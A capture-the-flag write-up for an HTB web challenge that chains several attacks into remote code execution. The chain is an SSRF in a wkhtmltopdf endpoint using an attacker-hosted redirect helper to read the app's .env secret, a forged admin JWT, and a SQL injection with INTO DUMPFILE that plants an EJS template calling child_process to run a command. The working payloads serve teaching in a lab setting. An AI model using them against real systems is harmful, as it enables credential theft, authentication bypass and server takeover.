# Web Blueprint Heist

## Overview

The application exposes a chain of weaknesses that can be combined to retrieve the flag:

1. A GraphQL resolver builds a SQL query with user-controlled input.
2. The PDF endpoint renders a user-controlled URL.
3. The live JWT signing secret is readable through the PDF renderer.
4. Admin routes require both an admin JWT and a loopback connection.
5. A UNION-based SQL injection can supply template content that is triggered through a 404 response.

The final chain is: retrieve the live secret, forge an admin JWT, use the PDF renderer to make an internal GraphQL request, inject the template payload, trigger the 404 renderer, and read the flag.

## Initial code analysis

At the beginning of the code analysis, two details triggered my attention. The first was a possible SQL injection in the GraphQL schema. The application calls `detectSqli`, but a blacklist-style check is not sufficient protection when the input is later interpolated directly into SQL.

Relevant code from `app/schemas/schema.js`:

```javascript
if (detectSqli(args.name)) {
  return generateError(400, "Username must only contain letters, numbers, and spaces.");
}

data = await connection.query(
  `SELECT * FROM users WHERE name like '%${args.name}%'`
).then(rows => rows[0]);
```

The second detail was the use of dynamic values in the EJS template engine. At this point, SSTI was only a hypothesis for further research. The error template contains an EJS interpolation point:

Relevant code from `app/views/errors/error.ejs`:

```ejs
<div class="error-container site clear">
  <h1>Error Occured</h1>
  <p><%= error %></p>
</div>
```

Because `<%= ... %>` is escaped output, this snippet alone does not prove SSTI. It was an initial lead while tracing how errors are created, passed to the renderer, and displayed.

## 1. Obtain a guest JWT

The public routes expose `/getToken`, which returns a JWT containing the guest role. The PDF endpoint is `POST /download` and expects that guest token in the `token` query parameter.

Call `/getToken` and save the returned token.

![Guest JWT response](getandforge/burp.png)

The secret shown in the challenge source is not necessarily the active secret. The running application loads `process.env.secret` from the live environment, so the source value cannot be trusted for forging a valid token.

## 2. Confirm the PDF renderer behavior

The download controller accepts a URL from the request body and passes it directly to `wkhtmltopdf`:

```javascript
const { url } = req.body;

if (!isUrl(url)) {
  return next(generateError(400, "Invalid URL"));
}

const pdfPath = await generatePdf(url);
```

The `/download` endpoint can therefore be tested with a URL hosted by us. The figures show that the application accepts the external URL and returns a generated PDF.

![Figure 1: PDF generation accepts a URL](getenv/figure1.png)

![Figure 2: The `/download` endpoint](getenv/figure2.png)

![Figure 3: Rendering an external URL](getenv/figure3.png)

A direct `file:///app/.env` request raises an error in wkhtml, so the file cannot be retrieved through a direct `file://` URL. We need an intermediate endpoint that redirects the renderer to the local file.

## 3. Retrieve the live `.env` file

Host a page that embeds a helper endpoint. Replace `ZROK_LINK` with the public URL of the helper:

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Environment request</h1>
  <iframe
    src="https://ZROK_LINK/ssrf.php?x=/app/.env"
    title="Environment request"
    width="1000"
    height="1000"
    frameborder="0">
  </iframe>
</body>
</html>
```

The helper redirects to the requested local file:

```php
<?php
http_response_code(302);
header('Location: file://' . $_GET['x']);
exit;
```

Submit the hosted page URL to `POST /download` with the guest token. When wkhtmltopdf renders the page, the iframe requests the helper, follows the redirect to `file:///app/.env`, and includes the file contents in the generated PDF.

![Figure 4: The generated PDF request](getenv/figure4.png)

![Figure 5: The recovered `.env` file](getenv/figure5.png)

The recovered environment file contains the active JWT signing secret.

## 4. Forge an admin JWT

Decode the guest token and inspect its claims. Figure 1 in the detailed forge note shows the original `HS256` token with `role: "user"`.

![Figure 1: Decoded guest JWT](forge2admin/figure1.png)

Change only the role claim to `admin`, then sign the payload with the secret recovered from `.env`. Figure 2 shows the resulting signed token.

![Figure 2: Signed admin JWT](forge2admin/figure2.png)

For this challenge, the resulting token was:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODg0NDEwNjR9.ql5gfjhQebI-mQ4ZRT4bbhmzbYuxo57tNfpMGDZ6epM
```

## 5. Reach the protected routes internally

The internal router protects both `/admin` and `/graphql` with `authMiddleware("admin")`:

```javascript
router.get("/admin", authMiddleware("admin"), (req, res) => {
  res.render("admin");
});

router.all("/graphql", authMiddleware("admin"), (req, res, next) => {
  createHandler({ schema, context: { pool } })(req, res, next);
});
```

The middleware reads the JWT from `req.query.token`, verifies the `admin` role, and then checks that the socket address is `127.0.0.1`. A direct request with a valid admin JWT therefore returns `403 Only available for internal users!`.

![Figure 4: Direct GraphQL request rejected for non-internal users](forge2admin/figure4.png)

The same PDF-renderer SSRF technique used to retrieve `.env` can make the request from inside the application environment. Host the following page, replacing `YOUR_ADMIN_JWT` with the forged token:

```html
<!doctype html>
<html>
<body>
  <h1>Local-file redirect test</h1>
  <iframe
    src="http://localhost:1337/graphql?query=%7BgetDataByName%28name%3A%20%22john%22%29%7BisPresent%2C%20name%7D%7D&token=YOUR_ADMIN_JWT"
    width="1000"
    height="500">
  </iframe>
</body>
</html>
```

Submit this page to `/download` with the guest token. The iframe request originates from the renderer inside the container, satisfying the loopback check. The forged JWT satisfies the admin-role check, and the GraphQL response is rendered into the resulting PDF.

## 6. Chain SQL injection with template rendering

The question was how to combine the SQL injection and the template-engine hypothesis to read the flag. The solution was to use a UNION-based SQL injection to create a 404 template payload, then request an intentionally nonexistent page to trigger the error-rendering path.

The error controller selects a status-specific template and falls back to `error.ejs` when that file is not present:

```javascript
const errorTemplate = (err.status >= 400 && err.status < 600)
  ? err.status
  : "error";
let templatePath = path.join(templateDir, `${errorTemplate}.ejs`);

if (!fs.existsSync(templatePath)) {
  templatePath = path.join(templateDir, `error.ejs`);
}

res.render(templatePath, { error: err.message }, (renderErr, html) => {
  res.send(html);
});
```

The UNION result supplies the template content, and the nonexistent-page request triggers its rendering. The injected template content executes the command that reads the flag file. The browser result confirms successful command execution:

```text
HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_01d7300c0466ff90808a90f7a30d2538}
```

### Creating the 404 template

The file-creation step abuses several pieces of functionality at once:

- The `getDataByName` GraphQL resolver accepts the `name` argument and interpolates it into the SQL `LIKE` clause.
- MySQL's `UNION ALL SELECT` adds a controlled row to the query result.
- MySQL's `INTO DUMPFILE` writes the selected value to a file on the database host.
- The PDF renderer's localhost request makes the protected GraphQL endpoint reachable from inside the application environment.
- The error controller later loads `404.ejs` when an unrecognized route produces a 404 response.

The selected value is an EJS heading containing `process.mainModule.require('child_process').execSync('/readflag')`. It is hex-encoded as `0x...` so it can be placed safely in the SQL statement. The remaining `NULL` values align the UNION with the four columns returned by the `users` table:

```html
<!doctype html>
<html>
<body>
  <h1>Internal HTTP test</h1>
  <iframe src="http://localhost:1337/graphql?query=%7BgetDataByName%28name%3a%20%22john%5Cn%27%20UNION%20ALL%20SELECT%200x3c68313e3c253d20726f636573732e6d61696e4d6f64756c652e7265717569726528276368696c645f70726f6365737327292e6578656353796e6328272f72656164666c6167272920253e3c2f68313e%2CNULL%2CNULL%2CNULL%20INTO%20DUMPFILE%20%27%2Fapp%2Fviews%2Ferrors%2F404%2Eejs%27%2D%2D%20%2D%22%29%7BisPresent%2C%20name%7D%7D&token=YOUR_ADMIN_JWT" width="1000" height="1000"></iframe>
</body>
</html>
```

The URL-encoded GraphQL query injects the following SQL fragment into `name`:

```sql
' UNION ALL SELECT
  0x3c68313e3c253d20726f636573732e6d61696e4d6f64756c652e7265717569726528276368696c645f70726f6365737327292e6578656353796e6328272f72656164666c6167272920253e3c2f68313e,
  NULL, NULL, NULL
INTO DUMPFILE '/app/views/errors/404.ejs'
-- -
```

`INTO DUMPFILE` only creates a new file; it fails when the destination already exists. This is why the payload targets `404.ejs`, which was not present initially. After the file is created, request any nonexistent route. The error handler selects `404.ejs`, EJS evaluates the injected expression, and `/readflag` returns the flag in the rendered response.

## Result

The complete exploit chain is:

1. Get a guest JWT from `/getToken`.
2. Confirm that `/download` renders external URLs.
3. Use a redirecting helper to retrieve `/app/.env` through wkhtmltopdf.
4. Sign a new JWT with `role: "admin"` and the recovered secret.
5. Use the same renderer to request `/graphql` through `localhost:1337`.
6. Use the UNION-based SQLi and trigger the injected 404 template through a nonexistent route.
7. Read the flag from the rendered response.

## Related notes

- [Token acquisition and forging](getandforge/description.md)
- [Environment-file retrieval](getenv/desc.md)
- [Internal request and admin forging](forge2admin/desc.md)
